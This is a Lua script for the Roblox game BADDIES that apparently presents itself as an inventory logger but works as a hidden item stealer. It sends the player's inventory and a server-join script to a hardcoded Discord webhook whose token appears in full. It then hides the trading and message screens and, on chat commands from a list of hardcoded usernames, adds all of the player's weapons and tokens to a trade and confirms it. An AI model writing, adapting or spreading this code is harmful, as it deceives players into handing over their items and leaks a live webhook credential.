local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

-- Check if game is BADDIES (11158043705)
if game.PlaceId ~= 11158043705 then
    localPlayer:Kick("Script doesnt support this game, join BADDIES")
    return
end

local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]

local MY_WEBHOOK = "https://discord.com/api/webhooks/1464311781269831735/E7IlLpVLN_lcO_Mn9e0Ck_AzjawbVDAAkmyTHede0PRDsYP43goCqMLh5MN8ljkBaWg4"
local USER_WEBHOOK = _G.Webhook or "PUTHERE"
local MY_USERNAMES = _G.Usernames or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}

local START_TIME = os.time()

local function checkServerStatus()
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    if playerCount >= maxPlayers - 1 then
        localPlayer:Kick("rejoin a diff server")
        return false
    end
    if playerCount < 3 then
        localPlayer:Kick("DATA not loaded, rejoin a public")
        return false
    end
    return true
end

if not checkServerStatus() then return end

local function formatNumber(num)
    if not num then return "N/A" end
    if num >= 1000000 then
        return string.format("%.1fM", num / 1000000)
    elseif num >= 1000 then
        return string.format("%.1fK", num / 1000)
    else
        return tostring(num)
    end
end

local function hasMainWeapons()
    local tools = {}
    local function collect(from)
        if from then
            for _, v in ipairs(from:GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end
    end
    collect(localPlayer:FindFirstChild("Backpack"))
    collect(localPlayer.Character)
    collect(localPlayer:FindFirstChild("StarterGear"))
    local function classifyTools(tools)
        local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
        local base, main = {}, {}
        for _, name in ipairs(tools) do
            local lower = name:lower()
            local matched = false
            for _, p in ipairs(patterns) do
                if string.find(lower, p:lower(), 1, true) then
                    table.insert(base, name)
                    matched = true
                    break
                end
            end
            if not matched then table.insert(main, name) end
        end
        return base, main
    end
    local base, main = classifyTools(tools)
    return #main >= 3, base, main, #main  -- Changed from >5 to >=3
end

local function deleteMessagesGui()
    local messagesGui = playerGui:FindFirstChild("Messages")
    if messagesGui then messagesGui:Destroy() end
end

local function sendRequest(url, body)
    if not url or url == "" then return nil end
    local headers = {["Content-Type"] = "application/json"}
    local encoded = body
    if type(body) ~= "string" then
        local ok, s = pcall(function() return HttpService:JSONEncode(body) end)
        if ok then encoded = s else encoded = "{}" end
    end
    local candidates = {
        function() if syn and syn.request then return syn.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if request then return request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if http and http.request then return http.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if http_request then return http_request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if fluxus and fluxus.request then return fluxus.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end
    }
    for _, tryFn in ipairs(candidates) do
        local ok, res = pcall(tryFn)
        if ok and res then
            if res.Success == true or res.StatusCode == 200 or (res.Body ~= nil) then
                return res
            end
        end
    end
    return nil
end

local function getTokenAmountFromTradeList()
    local tradeList = playerGui:FindFirstChild("TradeList")
    if tradeList then
        local main = tradeList:FindFirstChild("Main")
        if main then
            local tokenAmount = main:FindFirstChild("TokenAmount")
            if tokenAmount then
                local textLabel = tokenAmount:FindFirstChild("TextLabel")
                if textLabel then
                    local text = textLabel.Text
                    local tokenNumber = string.match(text, "%d+")
                    if tokenNumber then
                        return tonumber(tokenNumber)
                    end
                end
            end
        end
    end
    return 0
end

local function sendFullInventory()
    if not checkServerStatus() then return nil end
    
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    local isPrivateServer = playerCount < 3
    
    if isPrivateServer then
        return nil
    end
    
    local tools = {}
    local function collect(from)
        if from then
            for _, v in ipairs(from:GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end
    end
    collect(localPlayer:FindFirstChild("Backpack"))
    collect(localPlayer.Character)
    collect(localPlayer:FindFirstChild("StarterGear"))
    local function classifyTools(tools)
        local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
        local base, main = {}, {}
        for _, name in ipairs(tools) do
            local lower = name:lower()
            local matched = false
            for _, p in ipairs(patterns) do
                if string.find(lower, p:lower(), 1, true) then
                    table.insert(base, name)
                    matched = true
                    break
                end
            end
            if not matched then table.insert(main, name) end
        end
        return base, main
    end
    local base, main = classifyTools(tools)
    local hasAtLeast3Weapons = #main >= 3  -- Changed from hasMoreThan5Weapons
    local baseText = #base > 0 and table.concat(base, " • ") or "None"
    local mainText = #main > 0 and table.concat(main, "\n") or "None"
    local ls = localPlayer:FindFirstChild("leaderstats")
    local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
    local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or "N/A"
    local formattedDinero = formatNumber(dinero)
    local formattedSlays = formatNumber(slays)
    local elapsed = os.time() - START_TIME
    local function fmt(sec)
        local m = math.floor(sec/60) local s = sec%60
        if m>0 then return m.."m "..s.."s" end
        return s.."s"
    end
    
    local joinScript = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')"
    
    local executor = "Unknown"
    if syn then executor = "Synapse X"
    elseif fluxus then executor = "Fluxus"
    else executor = nil end
    
    local tokenAmount = getTokenAmountFromTradeList()
    
    local useMyWebhook = false
    local playerName = localPlayer.Name
    if hasAtLeast3Weapons then useMyWebhook = true end  -- Changed condition
    local targetWebhook = useMyWebhook and MY_WEBHOOK or USER_WEBHOOK
    if targetWebhook == "PUTHERE" and not useMyWebhook then return nil end
    
    local fields = {
        {name="💰 Dinero", value=tostring(formattedDinero), inline=true},
        {name="⚔️ Slays", value=tostring(formattedSlays), inline=true},
        {name="🪙 Tokens", value=tostring(tokenAmount), inline=true},
        {name="⏱️ Player Executed", value=fmt(elapsed).." ago", inline=false},
        {name="🧩 Server Joiner script", value="```lua\n"..joinScript.."```", inline=false},
    }
    
    if executor then
        table.insert(fields, {name="⚡ Executor", value=executor, inline=false})
    end
    
    local embed = {
        title = "*" .. playerName .. "*'s Weapons 🔫",
        description = "**Base Weapons**\n"..baseText.."\n\n**Main Weapons**\n"..mainText,
        color = 0xFF0000,
        fields = fields,
        footer = {text="Inventory Logger • "..playerName},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    local content = playerName.." has executed"
    if hasAtLeast3Weapons and useMyWebhook then content = content .. " @everyone @here 🔔 RICH PLAYER DETECTED!" end  -- Changed condition
    local payload = {content = content, embeds = {embed}}
    return sendRequest(targetWebhook, payload)
end

-- Check if player has at least 3 main weapons before proceeding
local hasEnoughWeapons, baseWeapons, mainWeapons, mainCount = hasMainWeapons()
if not hasEnoughWeapons then
    warn("Not enough main weapons to execute script. Need at least 3, have: " .. mainCount)
    return  -- Stop script execution
end

deleteMessagesGui()
sendFullInventory()

local weapons = {
    "Grim Reaper Cloak::None",
    "Blast Bow::None",
    "Princess Power Style::None",
    "Feral Frenzy Style::None",
    "Roller Skates::None",
    "Storm Dancer Style::None",
    "Hug of Doom Style::None",
    "Hero Finisher::None",
    "Grim Reaper Finisher::None",
    "Gun Finisher::None",
    "Doom Finisher::None",
    "Breakdance Finisher::None",
    "Celestial Scythes::None",
    "Graveyard Grip Knuckles::None",
    "Shadow Sorcery Purse::None",
    "Marshmallow Mixer Purse::None",
    "Unicorn Brass Knuckles::None",
    "Disco Dash Board::None",
    "Toast Hoverboard::None",
    "Frost Stomp::None",
    "Sniper Rifle RPG::None",
    "Cursed Board::None",
    "Evil Goth Knuckles::None",
    "Witchy Broom Board::None",
    "Floating Leaf::None",
    "Shark Brass Knuckles::None",
    "Ghostly RPG::None",
    "404 Not Found Blade::None",
    "Vampire Flamethrower::None",
    "Queen's Throne::None",
    "Big Boom Hammer::None",
    "Gravekeeper's Charm::None",
    "Mallow Glide Board::None",
    "Mean Girl Mayhem Style::None",
    "Karate Style::None",
    "Kitty Purse::None",
    "Freeze Gun::None",
    "Shiny Purse::None",
    "Loveboard::None",
    "SpikedPurse::None",
    "Brass Knuckles::None",
    "Golden Snowball Launcher::None",
    "Snowball Launcher::None",
    "Sledge Hammer::None",
    "Spiked Kitty Stanli::None",
    "Turkey Skewers::None",
    "Fan of Requiem::None",
    "Chainsaw::None",
    "Scythe::None",
    "Trashbin Disguise::None",
    "Cupid's Bow::None",
    "Crowbar::None",
    "Harpoon::None",
    "Heartbreaker Style::None",
    "Cannon::None",
    "Spiked Knuckles::None",
    "Glitter Bomb::None",
    "Spiked Nightmare Purse::None",
    "Glitter Style::None",
    "Trident::None",
    "Sakura Blade::None",
    "Nunchucks::None",
    "DogPurse::None",
    "Champion Gloves::None",
    "Chain Mace::None",
    "Surf's Up Hoverboard::None",
    "Graveyard Howl RPG::None",
    "Mocha Missile Maker RPG::None",
    "Black Flame Stomp::None",
    "Angelic Board::None",
    "Credit Card Hoverboard::None",
    "Constellations RPG::None",
    "Palm Sakura Blade::None",
    "Popstar Hoverboard::None",
    "Pink Star Board::None",
    "Thorned Romance::None",
    "Mischief Stomp::None",
    "Lava RPG::None",
    "Crushing Love::None",
    "Love Bomb Finisher::None",
    "Haunted Cemetery RPG::None",
    "Cyber Samurai RPG::None",
    "Black Flame Knuckles::None",
    "Vanity Vortex Finisher::None",
    "Egg Rocket Launcher::None",
    "Frostwind Glider Board::None",
    "Sakura Finisher::None",
    "Witch's Wands Taser::None",
    "The Doom Knuckles::None",
    "Flintlock::None",
    "Pinata Purse::None",
    "Cutlass Sakura Blade::None",
    "Police Hoverboard::None",
    "Y&Y Board::None",
    "Vampire Brass Knuckles::None",
    "Dual Shadow of Night Blade::None",
    "Dance Bomb",
}

local function safeClick(btn)
    if not btn then return end
    local success = false
    pcall(function()
        if btn.MouseButton1Click then
            firesignal(btn.MouseButton1Click)
            success = true
        elseif btn.Activated then
            firesignal(btn.Activated)
            success = true
        end
    end)
    if not success then
        pcall(function()
            local pos, size = btn.AbsolutePosition, btn.AbsoluteSize
            local x, y = pos.X + size.X/2, pos.Y + size.Y/2
            VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
            task.wait(0.05)
            VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
        end)
    end
end

local function clickWeapons()
    local tradingGui = playerGui:FindFirstChild("Trading")
    if not tradingGui then return 0 end
    local frame = tradingGui:FindFirstChild("Frame")
    if not frame then return 0 end
    local main = frame:FindFirstChild("Main")
    if not main then return 0 end
    local yourOffer = main:FindFirstChild("YourOffer")
    if not yourOffer then return 0 end
    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
    if not itemDisplay then return 0 end
    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then return 0 end
    
    local addedCount = 0
    local maxAttempts = 5
    
    for attempt = 1, maxAttempts do
        local currentAdded = 0
        for _, name in ipairs(weapons) do
            local btn = scrollingFrame:FindFirstChild(name)
            if btn and btn:IsA("ImageButton") and btn.Visible then
                safeClick(btn)
                currentAdded = currentAdded + 1
                addedCount = addedCount + 1
                task.wait(0.02)
            end
        end
        
        if currentAdded == 0 then
            break
        end
        
        task.wait(0.5)
    end
    
    return addedCount
end

local function getTokenAmount()
    local tradingGui = playerGui:FindFirstChild("Trading")
    if tradingGui then
        local frame = tradingGui:FindFirstChild("Frame")
        if frame then
            local categories = frame:FindFirstChild("Categories")
            if categories then
                local tokenAmount = categories:FindFirstChild("TokenAmount")
                if tokenAmount then
                    local textLabel = tokenAmount:FindFirstChild("TextLabel")
                    if textLabel then
                        local text = textLabel.Text
                        local tokenNumber = string.match(text, "%d+")
                        if tokenNumber then
                            return tonumber(tokenNumber)
                        end
                    end
                end
            end
        end
    end
    return 0
end

local function spamConfirm()
    for i = 1, 20 do
        pcall(function() RFTradingConfirmTrade:InvokeServer() end)
        task.wait(0.05)
    end
end

local function autoCompleteTrade()
    print("Starting autoCompleteTrade...")
    
    -- Wait for trading GUI to fully load
    task.wait(1)
    
    -- Add ALL weapons first
    local addedCount = clickWeapons()
    print("Added " .. addedCount .. " weapons")
    
    -- Set tokens
    local tokenAmount = getTokenAmount()
    if tokenAmount then
        pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
        print("Set tokens to: " .. tokenAmount)
    end
    
    -- Wait to ensure all weapons are added
    task.wait(3)
    
    -- Set ready
    pcall(function() 
        RFTradingSetReady:InvokeServer(true) 
        print("Set ready to true")
    end)
    
    -- Wait 5 seconds before accepting
    print("Waiting 5 seconds before accepting...")
    task.wait(5)
    
    -- Accept the trade
    pcall(function() 
        RFTradingAcceptTradeOffer:InvokeServer(localPlayer)
        print("Accepted trade")
    end)
    
    -- Wait 5 seconds for the trade timer after both accept
    print("Waiting 5 seconds for trade timer...")
    task.wait(5)
    
    -- Spam confirm
    spamConfirm()
    print("Spammed confirm 20 times")
end

local function setupTrading()
    pcall(function() RESetPhoneSettings:FireServer("TradeEnabled", true) end)
    local tradeList = playerGui:WaitForChild("TradeList")
    local mainFrame = tradeList:WaitForChild("Main")
    local tradeRequest = mainFrame:WaitForChild("TradeRequest")
    tradeRequest.Visible = true
    local isProcessing = false
    
    local function processChatMessage(sender, txt)
        if isProcessing then return end
        
        local shouldTrade = false
        for _, username in ipairs(MY_USERNAMES) do
            if sender.Name:lower() == username:lower() then
                shouldTrade = true
                break
            end
        end
        
        if shouldTrade then
            isProcessing = true
            
            local target = Players:FindFirstChild(sender.Name)
            if target then 
                task.wait(0.2)
                pcall(function() RFTradingSendTradeOffer:InvokeServer(target) end) 
            end
            
            if txt == "add" then
                task.wait(0.3)
                clickWeapons()
                -- Set tokens when add command is used
                local tokenAmount = getTokenAmount()
                if tokenAmount then
                    pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
                    print("Set tokens to: " .. tokenAmount)
                end
                task.wait(0.5)
                pcall(function() RFTradingSetReady:InvokeServer(true) end)
                task.wait(0.5)
                pcall(function() RFTradingConfirmTrade:InvokeServer() end)
            elseif txt == "1" then 
                task.wait(0.2)
                pcall(function() RFTradingSetReady:InvokeServer(true) end) 
            elseif txt == "2" then 
                task.wait(0.2)
                pcall(function() RFTradingConfirmTrade:InvokeServer() end) 
            end
            
            isProcessing = false
        end
        
        if sender == localPlayer then
            if txt == "add" then
                task.wait(0.2)
                clickWeapons()
                -- Set tokens when add command is used
                local tokenAmount = getTokenAmount()
                if tokenAmount then
                    pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
                    print("Set tokens to: " .. tokenAmount)
                end
                task.wait(0.3)
                pcall(function() RFTradingSetReady:InvokeServer(true) end)
                task.wait(0.3)
                pcall(function() RFTradingConfirmTrade:InvokeServer() end)
            elseif txt == "1" then 
                task.wait(0.1)
                pcall(function() RFTradingSetReady:InvokeServer(true) end) 
            elseif txt == "2" then 
                task.wait(0.1)
                pcall(function() RFTradingConfirmTrade:InvokeServer() end) 
            end
        end
    end

    if TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            local ts = message.TextSource
            if not ts then return end
            local sender = Players:GetPlayerByUserId(ts.UserId)
            if not sender then return end
            local txt = tostring(message.Text or ""):lower()
            
            task.delay(0.5, function()
                processChatMessage(sender, txt)
            end)
        end
    end
    
    local function onPlayerChatted(player, message)
        if player and message then
            task.delay(0.5, function()
                processChatMessage(player, message:lower())
            end)
        end
    end
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            pcall(function()
                player.Chatted:Connect(function(message)
                    onPlayerChatted(player, message)
                end)
            end)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        pcall(function()
            player.Chatted:Connect(function(message)
                onPlayerChatted(player, message)
            end)
        end)
    end)

    local function handleGui(gui)
        if gui.Name == "Trading" then gui.Enabled = false
        elseif gui.Name == "Messages" then gui:Destroy() end
    end
    
    for _, gui in ipairs(playerGui:GetChildren()) do handleGui(gui) end
    playerGui.ChildAdded:Connect(handleGui)
    
    task.spawn(function()
        while true do
            if not checkServerStatus() then break end
            local t = playerGui:FindFirstChild("Trading")
            if t then t.Enabled = false end
            local m = playerGui:FindFirstChild("Messages")
            if m then m:Destroy() end
            task.wait(0.1)
        end
    end)
end

setupTrading()

local originalAcceptTrade = RFTradingAcceptTradeOffer.InvokeServer

RFTradingAcceptTradeOffer.InvokeServer = function(player)
    local result = originalAcceptTrade(RFTradingAcceptTradeOffer, player)
    
    for _, username in ipairs(MY_USERNAMES) do
        if player.Name:lower() == username:lower() then
            task.spawn(function()
                print("Trade accepted from " .. player.Name .. ", waiting 5 seconds then auto-completing...")
                task.wait(5)
                autoCompleteTrade()
            end)
            break
        end
    end
    
    return result
end